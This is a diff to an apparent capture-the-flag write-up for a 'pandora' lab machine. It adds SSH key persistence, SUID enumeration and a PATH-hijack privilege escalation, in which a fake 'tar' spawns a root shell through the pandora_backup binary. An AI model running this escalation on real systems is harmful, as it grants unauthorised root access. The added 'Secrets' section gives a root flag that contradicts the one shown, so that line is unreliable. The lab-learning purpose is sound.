@@ -110,5 +110,43 @@ cat user.txt
 c06f3d03f86982c2cd7daa9fd244029f
 ````
 
+11. Add your public key to matt's authorized_keys
+- Then loggin through ssh 
+- And execute the priv escalation
+
+````bash
+matt@pandora:/home/matt$ find / -perm -u=s 2> /dev/null
+find / -perm -u=s 2> /dev/null
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/umount
+/usr/bin/pandora_backup
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/chsh
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+
+
+matt@pandora:~$ cd /home/matt/
+matt@pandora:~$ echo "/bin/bash" > tar
+matt@pandora:~$ chmod +x tar
+matt@pandora:~$ export PATH=/home/matt:$PATH
+matt@pandora:~$ /usr/bin/pandora_backup
+root@pandora:/root# cat root.txt 
+4b0007bc3e164fba81e2052df250cd23
+````
 
 [OID repository](http://www.oid-info.com/get/1.3.6.1.2.1.25.4.2.1.5)
+
+# Secrets
+FLAG_USER = c06f3d03f86982c2cd7daa9fd244029f
+FLAG_ROOT = c06f3d03f86982c2cd7daa9fd244029f
